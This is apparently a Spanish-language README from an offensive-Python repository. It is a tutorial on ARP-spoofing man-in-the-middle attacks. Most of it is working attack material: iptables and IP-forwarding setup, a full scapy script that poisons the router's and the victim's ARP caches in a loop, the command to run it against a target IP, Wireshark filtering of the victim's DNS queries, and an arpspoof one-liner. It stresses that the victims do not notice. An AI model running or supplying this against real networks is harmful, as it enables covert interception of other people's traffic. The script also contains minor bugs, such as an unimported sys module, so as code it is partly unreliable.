El concepto de **Man-In-The-Middle** (**MITM**) es crucial aquí, ya que el atacante se posiciona estratégicamente entre dos partes para interceptar o modificar el tráfico de datos, una táctica común en ataques cibernéticos. Esta técnica es posible debido a la naturaleza de confianza del protocolo ARP, que no verifica si las respuestas a las solicitudes ARP son legítimas.

![arpspoofer drawio](https://github.com/Frib1t/Python_Ofensivo/assets/102589078/7355a77a-eb73-4200-b9c0-44d0f96464ed)


- El atacante debe hacer creer al **Router** que la **IP** de la victima viene vinculada a mi dirección **MAC** enviando una respuesta falsificada.
- El atacante debe hacer creer a la maquina **victima** que la **IP** del Router tiene nuestra **MAC**, así alteramos la caché de ambos dispositivos alterando la Mac vinculada.

1 - Lo primero que debemos hacer es permitir aceptar paquetes entrantes para luego enviarlos al destino

```bash
iptables --policy FORWARD ACCEPT
```

2- Luego el ip_forward debe de estar seteado a 1, para después comunicarnos al destino legitimo. Si no lo hacemos, la victima no va a poder navegar después.

```bash
cat /proc/sys/net/ipv4/ip_forward
```

![Pasted image 20240426135703](https://github.com/Frib1t/Python_Ofensivo/assets/102589078/45136e52-bd8c-4f1d-8b37-5822be0e6978)


> Nos generamos una MAC aleatoria a modo de control para verla en el pc victima, esto lo podemos hacer con la aplicación macchanger de este mismo repositorio.

![Pasted image 20240426150023](https://github.com/Frib1t/Python_Ofensivo/assets/102589078/572cf6e8-9bd6-4388-b808-865515b9d5e7)


----

# arp_spoof.py

```python
#!/usr/bin/env python3
import scapy.all as scapy
import argparse
import time
import signal
from termcolor import colored

def signal_handler(sig, frame):
    print(colored(f"\n[!] Saliendo del programa...", 'red'))
    for sock in open_sockets:
        sock.close()
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)


def get_arguments():
	parser = argparse.ArgumentParser(description="ARP Spoofer")
	parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range to Spoof")

	return parser.parse_args()
	

def spoof(ip_address, spoof_ip):
    # valor 1, es una solicitud, 2 una respuesta, (en este caso nadie la solicitó)
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66") # creo una respuesta ARP
    scapy.send(arp_packet, verbose=False)


def main():
	arguments = get_arguments()
	while True:
		spoof(arguments.ip_address, "192.168.1.1") # objetivo - Router
		spoof("192.168.1.1", arguments.ip_address) # se imvierte para hacer el proceso pero a la victima
		time.sleep(2)


if __name__ == '__main__':
	main()
	
```

```python3
sudo python3 arpspoof.py -t 192.168.1.155
```


> Una vez lanzada la aplicación, si abrimos el Wireshark filtrando por dns, veremos todas las solicitudes de la victima. 
   Si probamos a abrir una web, veremos que la estamos interceptando.
   Podemos filtrar por **dns** o por la info que veamos en el programa, por ej: **dns.qry.name == "hackerone.com"**

![flameshotspoof](https://github.com/Frib1t/Python_Ofensivo/assets/102589078/cae9af52-2145-4d45-b74c-78ab7c35c981)



Y ya estaremos envenenando el trafico sin que se enteren.


Otra herramienta que automatiza todo es **arpspoof** funciona así:
```bash
arpspoof -i eth0 -t 192.168.1.155 -r 192.168.1.1
```

